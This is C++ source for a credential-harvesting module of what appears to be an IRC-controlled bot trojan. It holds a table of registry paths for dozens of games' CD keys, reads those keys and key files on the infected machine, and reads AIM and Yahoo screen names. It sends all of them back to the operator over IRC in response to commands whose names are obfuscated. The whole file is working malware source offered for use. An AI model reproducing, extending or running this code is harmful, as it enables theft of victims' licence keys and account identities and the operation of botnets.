#include "main.h"
#include "mainctrl.h"
#include "harvest_cdkeys.h"

#ifdef WIN32
struct items
{
	char	*GameName;
	HKEY	RootKey;
	char	*SubKey;
	char	*ValueName;
};

#define MAX_KEY_LENGTH	2048
#define MAX_VALUE_NAME	16383

items	CDKeyList[] =
{
	{ "[Battlefield 1942: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942\\ergc", "" },
	{ "[Battlefield 1942: Secret Weapons Of WWII: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 Secret Weapons of WWII\\ergc", "" },
	{ "[Battlefield 1942: The Road To Rome: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield 1942 The Road to Rome\\ergc", "" },
	{ "[Battlefield 1942: Vietnam:", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Battlefield Vietnam\\ergc", "" },
	{ "[Black and White: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Black and White\\ergc", "" },
	{ "[Command and Conquer: Generals: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Generals\\ergc",	"" },
	{ "[Command and Conquer: Generals: Zero Hour: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Command and Conquer Generals Zero Hour\\ergc", "" },
	{ "[Command and Conquer: Red Alert2: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Westwood\\Red Alert 2", "Serial" },
	{ "[Command and Conquer: Tiberian Sun: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Westwood\\Tiberian Sun", "Serial" },
	{ "[Counter-Strike: ", HKEY_CURRENT_USER, "Software\\Valve\\CounterStrike\\Settings", "Key" },
	{ "[FIFA 2002: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2002\\ergc", "" },
	{ "[FIFA 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\FIFA 2003\\ergc", "" },
	{ "[Freedom Force: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Distribution\\Freedom Force\\ergc", "" },
	{ "[Global Operations: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Global Operations\\ergc", "" },
	{ "[Gunman Chronicles: ", HKEY_CURRENT_USER, "Software\\Valve\\Gunman\\Settings", "Key" },
	{ "[Half-Life: ", HKEY_CURRENT_USER, "Software\\Valve\\Half-Life\\Settings", "Key" },
	{ "[Hidden and Dangerous 2: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Illusion Softworks\\Hidden & Dangerous 2", "key" },
	{ "[IGI2: Covert Strike: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\IGI 2 Retail\\CDKey", "CDkey" },
	{ "[Industry Giant 2: ", HKEY_CURRENT_USER, "Software\\JoWooD\\InstalledGames\\IG2", "prvkey" },
	{ "[James Bond 007: Nightfire: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\James Bond 007 Nightfire\\ergc", "" },
	{ "[Medal of Honor: Allied Assault: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault\\ergc", "" },
	{ "[Medal of Honor: Allied Assault: Breakthrough ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Breakthrough\\ergc", "" },
	{ "[Medal of Honor: Allied Assault: Spearhead ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA GAMES\\Medal of Honor Allied Assault Spearhead\\ergc", "" },
	{ "[Nascar Racing 2002: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2002\\ergc",	"" },
	{ "[Nascar Racing 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\Nascar Racing 2003\\ergc",	"" },
	{ "[NHL 2002: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2002\\ergc", "" },
	{ "[NHL 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Electronic Arts\\EA Sports\\NHL 2003\\ergc", "" },
	{ "[Need For Speed: Hot Pursuit 2: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Hot Pursuit 2\\ergc", "" },
	{ "[Need For Speed: Underground: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Need For Speed Underground\\ergc", "" },
    { "[Neverwinter Nights: ", HKEY_LOCAL_MACHINE, "Software\\BioWare\\NWN\\Neverwinter","Key" },
	{ "[Ravenshield: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Red Storm Entertainment\\RAVENSHIELD", ""},
	{ "[Shogun: Total War: Warlord Edition: ", HKEY_LOCAL_MACHINE,	"SOFTWARE\\Electronic Arts\\EA GAMES\\Shogun Total War - Warlord Edition\\ergc", "" },
	{ "[Soldiers Of Anarchy: ", HKEY_CURRENT_USER,	"Software\\Silver Style Entertainment\\Soldiers Of Anarchy\\Settings", "CDKey" },
	{ "[Soldier Of Fortune 2: ",HKEY_LOCAL_MACHINE, "Software\\Activision\\Soldier of Fortune II - Double Helix", "sof2key" },
	{ "[The Gladiators: ", HKEY_CURRENT_USER, "Software\\Eugen Systems\\The Gladiators", "RegNumber" },
	{ "[Unreal Tournament 2003: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Unreal Technology\\Installed Apps\\UT2003", "CDKey" },
	{ "[Unreal Tournament 2004: ", HKEY_LOCAL_MACHINE, "SOFTWARE\\Unreal Technology\\Installed Apps\\UT2004", "CDKey" },
	
};
#endif // WIN32

char	szKey[1024];
char	*szLogText;

void CHarvest_CDKeys::Init()
{
	// get.ck
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdCDKeys, dp(7,5,20,79,3,11,0).CStr(), this); 
	// get.m
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdMESSSn, dp(7,5,20,79,13,0).CStr(), this); 
}

bool CHarvest_CDKeys::HandleCommand(CMessage *pMsg)
{
	if(!pMsg->sCmd.Compare(m_cmdCDKeys.sName.CStr()))
	{
		/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
		#define arraysize(x)	(sizeof(x) / sizeof(x[0]))
		DWORD			dwSize = 2048;
		unsigned char	szBuffer[2048];
		int				i=0;
		char			*UserKey = (char *) malloc(128);
		/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

		CString WildC=pMsg->sChatString.Token(1," ");

		szLogText = new char[2048];
		memset(szLogText, 0, 2048);

		for(i;i < arraysize(CDKeyList); i++)
		{
			CString Key=CDKeyList[i].GameName;
			if(!strstr(strlwr(Key.Str()), strlwr(WildC.Str()))) continue;
			if(CDKeyList[i].RootKey != HKEY_CURRENT_USER)
			{
				/*~~~~~~~~~~~~~~*/
				HKEY	rk = NULL;
				/*~~~~~~~~~~~~~~*/

				sprintf(UserKey, "%s", CDKeyList[i].SubKey);
				memset(szBuffer, 0, sizeof(szBuffer));
				memset(szKey, 0, sizeof(szKey));
				memset(szLogText, 0, sizeof(szLogText));

				if(RegQueryValueEx(rk, CDKeyList[i].ValueName, NULL, NULL, szBuffer, &dwSize) == ERROR_SUCCESS)
				{
					g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s: %s", CDKeyList[i].GameName, szBuffer);
				}

				RegCloseKey(rk);

				/*
				 * strcat(szLogText, rKeyString); £
				 * ReadKey(szKey, CDKeyList[i].GameName, CDKeyList[i].RootKey,CDKeyList[i].SubKey,
				 * CDKeyList[i].ValueName, dwSize, szBuffer);
				 * g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice,
				 * pMsg->sReplyTo.Str(), szKey);
				 */
			}

			if(CDKeyList[i].RootKey == HKEY_CURRENT_USER)
			{
				/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/
				CHAR		achKey[2048];				/* buffer for subkey name */
				DWORD		cbName;						/* size of name string */
				CHAR		achClass[MAX_PATH] = "";	/* buffer for class name */
				DWORD		cchClassName = MAX_PATH;	/* size of class string */
				DWORD		cSubKeys = 0;				/* number of subkeys */
				DWORD		cbMaxSubKey;				/* longest subkey size */
				DWORD		cchMaxClass;				/* longest class string */
				DWORD		cValues;					/* number of values for key */
				DWORD		cchMaxValue;				/* longest value name */
				DWORD		cbMaxValueData;				/* longest value data */
				DWORD		cbSecurityDescriptor;		/* size of security descriptor */
				FILETIME	ftLastWriteTime;			/* last write time */
				DWORD		retCode;
				int			u;
				CHAR		achValue[MAX_VALUE_NAME];
				DWORD		cchValue = MAX_VALUE_NAME;
				/*~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~*/

				/*
				 * g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice,
				 * pMsg->sReplyTo.Str(), CDKeyList[i].GameName); £
				 * Get the class name and the value count.
				 */
				retCode = RegQueryInfoKey
					(
						CDKeyList[i].RootKey,			/* key handle */
						achClass,						/* buffer for class name */
						&cchClassName,					/* size of class string */
						NULL,					/* reserved */
						&cSubKeys,				/* number of subkeys */
						&cbMaxSubKey,			/* longest subkey size */
						&cchMaxClass,			/* longest class string */
						&cValues,				/* number of values for this key */
						&cchMaxValue,			/* longest value name */
						&cbMaxValueData,		/* longest value data */
						&cbSecurityDescriptor,	/* security descriptor */
						&ftLastWriteTime		/* last write time */
					);

				/* Enumerate the subkeys, until RegEnumKeyEx fails. */
				if(cSubKeys)
				{
					for(u = 0; u < cSubKeys; u++)
					{
						cbName = MAX_KEY_LENGTH;
						retCode = RegEnumKeyEx(HKEY_USERS, u, achKey, &cbName, NULL, NULL, NULL, &ftLastWriteTime);
						if(retCode == ERROR_SUCCESS)
						{
							/*~~~~~~~~~~~~~~*/
							HKEY	rk = NULL;
							/*~~~~~~~~~~~~~~*/

							sprintf(UserKey, "%s\\%s", achKey, CDKeyList[i].SubKey);
							memset(szBuffer, 0, sizeof(szBuffer));
							memset(szKey, 0, sizeof(szKey));
							if(RegOpenKeyEx(HKEY_USERS, UserKey, 0, KEY_READ, &rk) != ERROR_SUCCESS)
							{
							}

							if
							(
								RegQueryValueEx
									(
										rk,
										CDKeyList[i].ValueName,
										NULL,
										NULL,
										szBuffer,
										&dwSize
									) != ERROR_SUCCESS
							)
							{
								RegCloseKey(rk);
							}

							if
							(
								RegQueryValueEx
									(
										rk,
										CDKeyList[i].ValueName,
										NULL,
										NULL,
										szBuffer,
										&dwSize
									) == ERROR_SUCCESS
							)
							{
								g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "%s: %s", CDKeyList[i].GameName, szBuffer);
							}

							RegCloseKey(rk);
						}
					}
				}
			}
		}


		
		HKEY hkey=NULL; unsigned char szDataBuf[128]; unsigned char szDataBuf2[1024]; char line[100];

		dwSize = 128; LONG lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Activision\\Soldier of Fortune II - Double Helix", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "InstallPath", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
		{	char *szPath = (char*)malloc(MAX_PATH); FILE *fp;
			sprintf(szPath, "%s\\base\\mp\\%s", szDataBuf2, "sof2key");

			if((fp=fopen(szPath,"r"))!=NULL)
			{	if(fgets(line, 100, fp))
					if(!strstr(line, "mtkwftmkemfew3p3b7"))
					{	g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
							"Found SOF2 CDKey (%s).", line); }
				fclose(fp); }
			if(szPath) free(szPath); }
		RegCloseKey(hkey);

		/*
				Call of Duty
		*/

		// Warezed: TSH3XSWTYPWGUUTXE660

		dwSize = 128; lRet = RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Activision\\Call of Duty", 0, KEY_READ, &hkey);
		if(RegQueryValueEx(hkey, "InstallPath", NULL, NULL, szDataBuf2, &dwSize)== ERROR_SUCCESS)
		{	char *szPath = (char*)malloc(MAX_PATH); FILE *fp;
			sprintf(szPath, "%s\\main\\%s", szDataBuf2, "codkey");

			if((fp=fopen(szPath,"r"))!=NULL)
			{	if(fgets(line, 100, fp))
					if(!strstr(line, "TSH3XSWTYPWGUUTXE660"))
					g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), \
						"Found COD CDKey (%s).", line);
				fclose(fp); }
			if(szPath) free(szPath); }
		RegCloseKey(hkey);

		return true;
	}

	else if(!pMsg->sCmd.Compare(m_cmdMESSSn.sName.CStr())) {
		#ifdef WIN32
			HKEY hRegKey;

			if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\America Online\\AOL Instant Messenger (TM)\\CurrentVersion\\Login", 0, KEY_ALL_ACCESS, &hRegKey) != ERROR_SUCCESS)
				return true;
			char cAIM[256];
			unsigned long type, length;
			memset(cAIM, 0, sizeof(cAIM));
			length = sizeof(cAIM);
			if (RegQueryValueEx(hRegKey, "Screen Name", 0, &type, (BYTE *)cAIM, &length) != ERROR_SUCCESS)
			{
				RegCloseKey(hRegKey);
				return true;
			}
			cAIM[length] = 0;
			RegCloseKey(hRegKey);
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "aim: %s", cAIM);
			
			
			if (RegOpenKeyEx(HKEY_CURRENT_USER, "Software\\Yahoo\\Pager", 0, KEY_ALL_ACCESS, &hRegKey) != ERROR_SUCCESS)
				return true;
			char cYahoo[256];
			memset(cYahoo, 0, sizeof(cYahoo));
			length = sizeof(cAIM);
			if (RegQueryValueEx(hRegKey, "Yahoo! User ID", 0, &type, (BYTE *)cYahoo, &length) != ERROR_SUCCESS)
			{
				RegCloseKey(hRegKey);
				return true;
			}
			cAIM[length] = 0;
			RegCloseKey(hRegKey);
			g_cMainCtrl.m_cIRC.SendFormat(pMsg->bSilent, pMsg->bNotice, pMsg->sReplyTo.Str(), "yahoo: %s", cYahoo);

	#endif
	}
	return true; 
}
